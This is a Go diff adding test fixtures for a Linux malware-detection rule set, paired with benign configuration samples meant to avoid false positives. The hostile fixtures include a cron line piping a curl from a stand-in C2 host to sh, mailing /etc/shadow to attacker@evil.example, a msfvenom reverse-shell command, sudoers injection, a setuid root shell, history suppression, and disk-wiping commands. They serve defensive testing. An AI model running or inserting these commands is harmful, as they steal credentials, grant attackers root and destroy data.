@@ -116,6 +116,54 @@ var embeddedRuleFixtures = []ruleFixture{
 		filename: "common-auth",
 		payload:  []byte("auth optional pam_exec.so /tmp/.session_logger.sh\n"),
 	},
+	{
+		ruleName: "Linux_Persistence_Cron_Volatile_Execution",
+		path:     "/etc/cron.d/sync-job",
+		filename: "sync-job",
+		payload:  []byte("* * * * * root echo 'curl -s http://c2.example/x' | sh > /var/spool/cron/root && cp /tmp/p /tmp\n"),
+	},
+	{
+		ruleName: "Linux_Backdoor_SSH_AuthorizedKeys_Command",
+		path:     "/root/.ssh/authorized_keys",
+		filename: "authorized_keys",
+		payload:  []byte("command=\"/bin/sh -c id\" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAQw==\n"),
+	},
+	{
+		ruleName: "Linux_Malware_Botnet_Framework_Strings",
+		path:     "/tmp/payload_setup.sh",
+		filename: "payload_setup.sh",
+		payload:  []byte("msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 -f elf -o /tmp/beacon\n"),
+	},
+	{
+		ruleName: "Linux_Evasion_History_AntiForensics",
+		path:     "/home/user/.bashrc",
+		filename: ".bashrc",
+		payload:  []byte("export HISTFILE=/dev/null\n"),
+	},
+	{
+		ruleName: "Linux_Privilege_Sudoers_NOPASSWD_Inject",
+		path:     "/tmp/privesc.sh",
+		filename: "privesc.sh",
+		payload:  []byte("echo 'attacker ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/stealth\n"),
+	},
+	{
+		ruleName: "Linux_Credential_Shadow_Dump",
+		path:     "/tmp/cred.sh",
+		filename: "cred.sh",
+		payload:  []byte("cat /etc/shadow | mail -s creds attacker@evil.example\nunshadow passwd.txt shadow.txt > hashes.txt\n"),
+	},
+	{
+		ruleName: "Linux_Impact_Wiper_Destructive_Commands",
+		path:     "/tmp/wipe.sh",
+		filename: "wipe.sh",
+		payload:  []byte("rm -rf --no-preserve-root /\nshred -vfz -n 10 /dev/sda\n"),
+	},
+	{
+		ruleName: "Linux_Backdoor_Setuid_Shell",
+		path:     "/tmp/priv.sh",
+		filename: "priv.sh",
+		payload:  []byte("cp /bin/bash /tmp/.rootshell\nchmod 4755 /tmp/.rootshell\n"),
+	},
 }
 
 // benignContentFixtures are legitimate code samples that must not trigger any
@@ -151,5 +199,35 @@ var benignContentFixtures = []ruleFixture{
 		path:     "/opt/backup/nightly.py",
 		filename: "nightly.py",
 		payload:  []byte("import os, zlib\nfor root, dirs, files in os.walk('/srv/data'):\n    for f in files:\n        blob = zlib.compress(open(os.path.join(root, f), 'rb').read())\n        store(blob, f)\n"),
+	},
+	{
+		ruleName: "__benign_cron_backup__",
+		path:     "/etc/cron.d/backup",
+		filename: "backup",
+		payload:  []byte("30 2 * * * root /usr/local/sbin/backup.sh >> /var/log/backup.log\n"),
+	},
+	{
+		ruleName: "__benign_sshd_config__",
+		path:     "/etc/ssh/sshd_config",
+		filename: "sshd_config",
+		payload:  []byte("Match User deploy\n    PermitTTY yes\n    X11Forwarding no\n"),
+	},
+	{
+		ruleName: "__benign_bashrc_histsize__",
+		path:     "/home/user/.bashrc",
+		filename: ".bashrc",
+		payload:  []byte("HISTSIZE=1000\nHISTFILESIZE=2000\n"),
+	},
+	{
+		ruleName: "__benign_sudoers_corporate__",
+		path:     "/etc/sudoers.d/devops",
+		filename: "devops",
+		payload:  []byte("%devops ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart myapp\n"),
+	},
+	{
+		ruleName: "__benign_chmod_script__",
+		path:     "/usr/local/bin/setup.sh",
+		filename: "setup.sh",
+		payload:  []byte("chmod 755 /usr/local/bin/mytool\ninstall -m 0755 build/mytool /usr/local/bin/\n"),
 	},
 }
